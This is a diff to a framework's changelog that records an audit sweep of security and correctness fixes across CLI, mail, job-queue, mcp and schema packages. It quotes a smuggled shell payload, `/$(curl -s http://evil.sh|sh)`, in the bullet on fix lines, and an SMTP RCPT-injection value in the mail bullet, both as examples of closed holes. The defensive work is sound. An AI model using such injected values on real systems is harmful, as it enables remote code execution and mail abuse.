@@ -8,6 +8,17 @@ Semver applies from 1.0.0. A breaking change to a documented API needs a major �
 
 ## [Unreleased]
 
+Sweep 3 of the same hunt, 2026-09-06, on the surfaces nobody had read: the gate's own rules (which
+of them a spelling evades), the ~200 CLI files two sweeps had not reached, and the `ai`/`mcp`/
+`manifest`/`mail`/`notify` internals. 47 findings fixed, one blocked (the `policy` step cannot see
+an admin page's permissions — `@ultimat3/admin` has no registry to read; next sweep), one dropped.
+Eleven new codes, all gate-side and named below; one new ratchet. Deferred, by name: the
+`fix-shell-arg` rows for `auth` (a `curl` on a URL from a provider's discovery document) and `db`
+(a catalog column name and a migration path reaching `git checkout --` and `rm`), both pinned with
+the sentence saying so; `db/migrate.ts`'s `x db gen "fix <name>"`, whose value lives inside double
+quotes and needs a screen that does not exist yet; and `manifest`'s diff fixture, which promises
+every field and carries neither `mutator` nor `rateLimit`.
+
 Sweep 2 of the same hunt, 2026-09-06, on three axes the tier hunters could not reach: a
 concurrency audit (what happens when this is interrupted, raced or restarted), a security audit
 (the `fix:` line as a shell command, tenancy, redirects, images) and a parity pass over the files
@@ -30,6 +41,14 @@ Two seams measured from the same app on 2026-09-06 — on 19.1.3, and confirmed 
 Neither is breaking.
 
 ### Removed
+
+- **`x jobs drain --to memory` is refused by name.** `wiki/CLI-Reference.md` listed `memory` as a
+  supported target; it acked every durable job off the source queue into a `Map` inside a process
+  about to exit and reported `ok: true` — the one drain target that "worked" was the one that
+  destroyed the work, against the same page's promise that a crash mid-drain duplicates a job
+  instead of losing it. A minor carries the removal: a documented path whose only effect was data
+  loss is a defect, not a contract. The durable targets are `redis` and `nats`; both are still
+  `X_NOT_IMPLEMENTED`, and their `fix:` no longer sends anyone to the drain.
 
 - **`OFFLINE_FALLBACK` is gone from the `@ultimat3/cli` barrel** — it was documented nowhere, so this is not a break of a documented API and a minor carries it. It was the literal
   `apps/web/app/offline.tsx`: a filename `registerRoute` refuses with `X_ROUTE_FILE_INVALID` (the
@@ -158,6 +177,28 @@ Neither is breaking.
   counts however it is spelled (`!**` and `!*.key` re-admit the key too), and an unrelated negation
   — the `!**/.env.example` every ignore file in this tree carries — still leaves the exclusion in
   force.
+
+
+- **New: `bun run fix-shell-arg` refuses a value spliced into the shell command position of a `fix:` line.** `x g route /$(curl -s http://evil.sh|sh)` was a real rendered fix, `renderFixShellArg` closed that one site, and nothing watched the other 152 — every value was typed `string`, which `error-render` does not read. Matched on POSITION, never a name; a ratchet pinned per package with the sentence saying where each package's values come from.
+- **The gate's own rules stopped reading green through the defect each was written for.** `proto-index`'s null-prototype exemption is per TABLE, not per file (one unrelated `Object.create(null)` hid a caller-supplied `DIALECTS[dialect]` on a public entry point of `@ultimat3/schema`); `skip-if-cleanup` tracks the reset per callee, so a file-scope `afterAll(() => resetClock())` no longer launders a `clearRegistry()` parked inside `describe.skipIf`, and it reads `registry.clear()`, the braced one-line early return and `afterAll(clearRegistry)`; `sql-literal-copies` walks balanced parentheses, so `split("'").join("''")` is the escape it always was; `secret-compare` learned `startsWith`/`endsWith`, `indexOf`, `switch`/`case` and `deepEquals` — `@ultimat3/auth` measured zero before and after; `index-of-order` reads the `OrEqual` matchers a phantom `-1` passes identically; `flight-copies` recognises `Math.pow`, a ternary clamp and a curve rolling `crypto.getRandomValues`; `framework-tables` reads a quoted or schema-qualified relation; `config-readers` derives leaves from a `type` alias and any indent, checked against a config `defineConfig` actually builds; the admin-flattener check reads the seven `.tsx` screens it skipped.
+- **A pin with a blank reason waives nothing** in `config-readers`, `secret-compare` and `proto-index` (`X_*_PIN_UNEXPLAINED`), and `configAmbiguityPinnedFor` is finally called by the rule that declared it.
+- **`render-modes`, `frozen-records` and `flight-copies` publish their findings in `--json`** instead of `findings: []` on a red run, and the first two carry an `X_*` code at all (`X_VOCABULARY_REDECLARED`, `X_FROZEN_RECORD_INFERRED`).
+- **A bare `x test` runs `live` and `e2e` files in their own one-worker pass.** The serial clamp applied only when a type was named, so `x test --workers 8` ran a replication-slot suite and a shared-`dist/` suite at `--parallel=8` beside the unit files; the selection is partitioned by each file's own type and the serial types get a `--parallel=1` pass each.
+- **`X_PORT_IN_USE`'s fix names a port pair that is free.** Both `x dev` and `x doctor` suggested `x dev --port <web+1>` — the sync port that was just reported occupied — and two tests pinned it under names promising the opposite; `portPairAfter` answers the nearest base whose own `PORT`/`PORT+1` touches neither, and `x doctor` derives the sync port through `syncPortFor`, so `--port 65535` is `X_PORT_INVALID` rather than a probe of 65534.
+- **Everything after `--` reaches `bun test`.** `ParsedArgs.passthrough` was documented as "handed to the underlying tool verbatim" and read by nothing, so `x test unit -- --coverage --bail` dropped both flags silently; `test` declares it and forwards it, and every other command refuses a `--` tail with `X_CLI_BAD_FLAG`.
+- **The job queue's database client reads the environment the boot was handed.** `startQueue` called `startDb` without `env`, so `DATABASE_REPLICA_URL` came off `process.env` while the replica middleware was decided from the boot env — two halves of one decision from two sources; `env` is a required parameter now.
+- **`x g admin:page` declares the permission it requires and refuses a malformed `--permission`.** The scaffold emitted `permissions: ['ops:read']` that no app declared, so the generated page was denied for every actor; the `policy` gate step still cannot see admin pages (no registry in `@ultimat3/admin` to read — deferred).
+- **`cli`: a caught value's `code` is read through `stringField` at two sites; `prettyJson` sorts every level; the boundary check sees `node:http`; the stale step ordinals are gone.**
+- **`jobs`: the redis and nats stubs' `X_NOT_IMPLEMENTED` fix names a repair that runs.** It told the operator to `x jobs drain --to memory`, the invocation the CLI now refuses; `enqueue` on a stub refuses too, so nothing was ever queued onto one and there is nothing to move — `setJobDriver(createPgDriver())` at boot is the whole repair. `wiki/Jobs-And-Workflows.md`, the jobs tutorial, `wiki/Upgrading.md` and `docs/architecture/04-error-contract.md` stop promising a drain procedure nothing rehearses.
+- **`mcp`: the stdio transport waits for every frame to leave the process.** `defaultWrite` returned `void` while `Bun.stdout.write()` returns a promise, so every `await write(...)` in `serveStdio` awaited nothing and the CLI exited with the tail of a large `tools/call` result still queued — measured, a 4 MB frame arrived at 1.4 MB. The same rule `emitManifest` already followed, now pinned by a child-process test.
+- **`mail`: an SMTP envelope accepts a display-form recipient.** `to: 'Jane Doe <jane@x.test>'` rendered a correct `To:` header and then hit `assertEnvelopeAddress`, which refuses angle brackets, so the SMTP driver answered `X_MAIL_ADDRESS_INVALID` for an address every other driver delivered. The normalisation lives at the one gate both `MAIL FROM` and `RCPT TO` pass through — control characters are checked on the RAW value first, because stripping first would let `bcc: 'ops@x\r\nRCPT TO:<attacker>'` through as a clean mailbox, which the package's own injection test proves.
+- **`mail`: `From`, `To` and `Cc` are 7-bit on the wire.** A non-ASCII display name went out as raw UTF-8 while `Subject` was RFC 2047-encoded, and the client never negotiates `SMTPUTF8`; the phrase is encoded and the addr-spec copied verbatim, so an ASCII header is byte-identical to before.
+- **`notify`: `markRead` with a malformed id answers 0 instead of raising `22P02`.** The Postgres store bound `any($2::uuid[])`, so one hand-typed id in a batch lost every good one where the memory twin skipped it; ids are screened before binding, and the memory `list` gained the `id` tiebreak the SQL always had.
+- **`manifest`: `ActionFact.mutator` and `mcp.description` are classified.** Losing `mutator` is breaking (it decides HTTP method and idempotency in the typed client and OpenAPI), gaining it is additive, a description change is internal; until now two manifests differing only in `mutator` diffed as `buildId` alone — the exact class the file's own header names.
+- **`ai`: `deleteSql([])` emits `1 = 0`, not `"id" in ()`; a usage-only `message_delta` no longer overwrites `stopReason` with `end_turn`; `jsonSchemaValid` reads required keys through `Object.hasOwn` so `['constructor']` scores 0; `embedBatched` refuses an embedder that returns fewer vectors than texts with `X_AI_EMBEDDER_INVALID` instead of a `TypeError` in the store.**
+- **`mcp`: a schema property named `__proto__` is a property.** `input-schema.ts` assigned through the setter, so `tools/list` published a schema missing it while `validate-args` refused it as unknown.
+- **A value a shell would read no longer reaches a `fix:` in `auth`, `db`, `core`, `http`, `cache` or `scraping`.** A provider's `jwks_uri`, userinfo and token endpoints (all filled from the issuer's own discovery document), a migration file name on the `rm` that deletes a migration's files, a secrets path inside `export KEY="$(cat …)"` and on three `git checkout --` lines, a purge endpoint from `.env.production`, a browser profile directory on an `rm -f`, and a `code` read off a foreign throwable now go through `renderFixShellArg` / `FRAMEWORK_CODE` / a whole-line degradation to prose; the value still travels in the `cause`, which is read rather than pasted.
+- **`schema`: `toJsonSchema` refuses a dialect nothing publishes instead of answering with `Object`'s constructor.** `DIALECTS[dialect]` was a prototype-reachable read on a public entry point's option, hidden from `proto-index` by an unrelated null-prototype table in the same file, so `dialect: 'constructor'` put the `Object` function in `$schema`, where `JSON.stringify` dropped it in silence; it is `Object.hasOwn` plus `X_SCHEMA_UNSUPPORTED` now, refused whether or not `includeDialect` would have emitted it.
 
 ## 19.2.0 - 2026-09-06
 
